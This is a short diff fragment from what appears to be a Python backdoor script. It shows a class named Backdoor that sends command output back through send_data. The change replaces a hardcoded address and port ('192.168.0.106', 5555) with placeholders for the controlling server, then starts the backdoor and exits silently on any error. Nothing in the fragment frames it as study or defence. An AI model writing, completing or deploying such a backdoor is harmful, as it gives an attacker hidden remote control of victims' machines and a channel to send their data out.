@@ -80,7 +80,7 @@ class Backdoor:
             self.send_data(output)
 
 try:
-    backdoor = Backdoor('192.168.0.106',5555)
+    backdoor = Backdoor('server_ip',server_port)
     backdoor.run()
 except Exception:
     sys.exit()        
